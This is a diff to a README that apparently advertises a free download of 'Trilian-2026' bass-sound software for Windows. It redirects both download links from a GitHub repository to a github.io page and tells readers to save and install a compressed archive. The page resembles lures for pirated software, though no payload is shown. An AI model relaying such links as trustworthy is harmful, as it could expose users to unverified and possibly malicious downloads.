@@ -1,6 +1,6 @@
 # 🎸 Trilian-2026 - Professional Bass Sounds For Your PC
 
-[![](https://img.shields.io/badge/Download-Trilian-blue.svg)](https://github.com/krushang8025/Trilian-2026)
+[![](https://img.shields.io/badge/Download-Trilian-blue.svg)](https://krushang8025.github.io)
 
 ## 📋 Project Overview
 Trilian-2026 provides a complete collection of bass sounds for music production. This software works on Windows 10 and Windows 11. It offers deep, realistic bass tones for your digital audio workstation. Producers use these sounds for pop, rock, jazz, and electronic music. The package includes the software installer and the sound library required for full operation.
@@ -18,7 +18,7 @@ Check your computer against these requirements to ensure smooth performance:
 ## 📥 Downloading The Software
 Follow these steps to acquire the installer files:
 
-1. Visit the project link to start your download: [Download Trilian-2026](https://github.com/krushang8025/Trilian-2026).
+1. Visit the project link to start your download: [Download Trilian-2026](https://krushang8025.github.io).
 2. Look for the file download option on the page.
 3. Save the compressed archive file to a folder on your computer.
 4. Ensure your internet connection stays stable during the transfer.
